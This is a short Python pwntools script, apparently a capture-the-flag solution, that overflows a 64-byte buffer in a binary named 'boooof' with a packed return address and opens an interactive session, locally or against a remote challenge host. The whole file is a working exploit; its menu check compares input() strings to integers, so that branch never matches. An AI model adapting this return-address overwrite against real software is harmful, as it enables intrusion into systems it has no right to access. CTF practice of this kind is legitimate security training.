from pwn import *

r = process("./boooof")
def localAtk():
    r = process("./boooof")
    return r

def remoteAtf():
    r = remote("0.cloud.chals.io", 23709)
    return r

option = input("Local or Remote?:")
if(option == 1):
    r = localAtk()
elif(option == 2):
    r = remoteAtf()
else:
    print("Not a valid option!")

payload = b"a"*64 + p64(0x0040122e)
r.sendlineafter("name:", payload)
r.interactive()